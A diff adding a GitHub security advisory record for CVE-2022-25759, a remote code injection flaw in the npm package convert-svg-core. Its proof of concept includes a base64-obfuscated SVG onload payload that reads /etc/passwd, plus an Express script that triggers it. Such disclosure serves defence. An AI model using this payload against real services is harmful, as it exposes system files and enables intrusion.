@@ -1,0 +1,73 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-5gxc-fxcr-9326",
+  "modified": "2024-04-22T23:21:54Z",
+  "published": "2022-07-23T00:00:16Z",
+  "aliases": [
+    "CVE-2022-25759"
+  ],
+  "summary": "convert-svg-core vulnerable to remote code injection",
+  "details": "The package convert-svg-core before 0.6.2 is vulnerable to Remote Code Injection via sending an SVG file containing the payload in an `onload` attribute. Puppeteer/Chromium (used by convert-svg-core) will execute any code within that tag, including malicious code.\n\n### PoC\n\n**Payload**\n\n```html\n<svg onload=eval(atob(this.id)) id='ZG9jdW1lbnQud3JpdGUoJzxzdmctZHVtbXk+PC9zdmctZHVtbXk+PGlmcmFtZSBzcmM9ImZpbGU6Ly8vZXRjL3Bhc3N3ZCIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwMHB4Ij48L2lmcmFtZT48c3ZnIHZpZXdCb3g9IjAgMCAyNDAgODAiIGhlaWdodD0iMTAwMCIgd2lkdGg9IjEwMDAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHRleHQgeD0iMCIgeT0iMCIgY2xhc3M9IlJycnJyIiBpZD0iZGVtbyI+ZGF0YTwvdGV4dD48L3N2Zz4nKTs='></svg>\n```\nwhere the `id` attribute is the base 64-encoded form of \n\n```js\ndocument.write('<svg-dummy></svg-dummy><iframe src=\"file:///etc/passwd\" width=\"100%\" height=\"1000px\"></iframe><svg viewBox=\"0 0 240 80\" height=\"1000\" width=\"1000\" xmlns=\"http://www.w3.org/2000/svg\"><text x=\"0\" y=\"0\" class=\"Rrrrr\" id=\"demo\">data</text></svg>');\n```\n\n\n**Attack**\n\n```js\nconst { convert } = require('convert-svg-to-png');\nconst express = require('express');\nconst fileSvg = `[[[payload]]]`;\n// YWxlcnQoMSk=\n// function newContent(){document.open(),document.write('<text x=\\\"0\\\" y=\\\"0\\\" class=\\\"Rrrrr\\\" id=\\\"demo\\\">data</text>'),document.close()}\nconst app = express();\napp.get('/poc', async (req, res)=>{\n  try {\n    const png = await convert(fileSvg);\n    res.set('Content-Type', 'image/png');\n    res.send(png);\n  } catch (e) {\n      console.log(e);\n    res.send(\"\");\n  }\n});\napp.listen(3000, ()=>{\n  console.log('started');\n});\n```",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "convert-svg-core"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.6.2"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-25759"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/neocotic/convert-svg/issues/81"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/neocotic/convert-svg/pull/82"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/neocotic/convert-svg/commit/7e6031ac7427cf82cf312cb4a25040f2e6efe7a5"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/neocotic/convert-svg"
+    },
+    {
+      "type": "WEB",
+      "url": "https://security.snyk.io/vuln/SNYK-JS-CONVERTSVGCORE-2849633"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-94"
+    ],
+    "severity": "CRITICAL",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-04-22T23:21:54Z",
+    "nvd_published_at": "2022-07-22T20:15:00Z"
+  }
+}
